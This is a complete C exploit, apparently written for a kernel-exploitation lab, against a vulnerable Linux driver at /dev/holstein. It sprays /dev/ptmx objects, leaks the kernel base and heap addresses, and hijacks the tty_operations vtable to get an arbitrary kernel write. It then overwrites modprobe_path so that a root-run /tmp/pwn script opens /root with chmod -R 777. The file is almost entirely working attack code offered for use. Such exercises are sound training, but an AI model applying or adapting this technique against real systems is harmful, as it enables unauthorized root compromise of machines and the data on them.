#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define DEVICE "/dev/holstein"
#define SPRAY_OBJECT "/dev/ptmx"
#define BUFFER_SIZE 0x400
#define SPRAY_WIDTH 100

#define mov_prdx_rsi (kbase + 0x0b8375)
#define modprobe_path (kbase + 0xe38180)
unsigned long kbase;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

int fd;
int ptmx[SPRAY_WIDTH];
char payload[BUFFER_SIZE+0x200];
unsigned long slot_buf;

void error(const char *msg) {
    perror(msg);
    exit(1);
}

void exploit_modprobe() {
    puts("[*] Setting up for fake modprobe");

    system("echo '#!/bin/sh\nchmod -R 777 /root' > /tmp/pwn");
    system("chmod +x /tmp/pwn");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("\n[*] idle...");
    exit(0);
}

void spray() {
    for(int i = 0; i < SPRAY_WIDTH/2; i++) {
        ptmx[i] = open(SPRAY_OBJECT, O_RDWR | O_NOCTTY);
        if (ptmx[i] < 0) {
            error("[-] open spray");
        }
    }
    
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        error("[-] open device");
    }
    printf("[+] device opened at := %d\n", fd);

    for(int i = 50; i < SPRAY_WIDTH; i++) {
        ptmx[i] = open(SPRAY_OBJECT, O_RDWR | O_NOCTTY);
        if (ptmx[i] < 0) {
            error("[-] open spray");
        }
    }
}

void AAW32(unsigned long addr, unsigned int val) {
    // overwriting tty_operations vtable
    *(unsigned long *)&payload[0x418] = slot_buf;
    *(unsigned long *)&payload[12*sizeof(long)] = mov_prdx_rsi;

    // sending payload
    if (write(fd, &payload, 0x450) < 0) {
        error("[-] write");
    }

    // triggering payload
    for(int i = 0; i < SPRAY_WIDTH; i++){
        ioctl(ptmx[i], val /* esi ecx r12d */, addr /* rdx r8 r14 */);
    }
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);

    spray();
    if (read(fd, payload, 0x450) < 0) {
        error("[-] read");
    }

    slot_buf = *(unsigned long *)&payload[0x438] - 0x438;
    kbase = *(unsigned long *)&payload[0x418] - 0xc38880;
    printf("[+] g_buf := %#lx\n", slot_buf);
    printf("[+] kernel base := %#lx\n", kbase);

    char evil_modprobe[] = "/tmp/pwn";
    for(int i = 0; i < sizeof(evil_modprobe); i += 4) {
        AAW32(modprobe_path + i, *(unsigned int *)&evil_modprobe[i]);
    }
    exploit_modprobe();

    puts("\n[*] idle...");
    getchar();   
}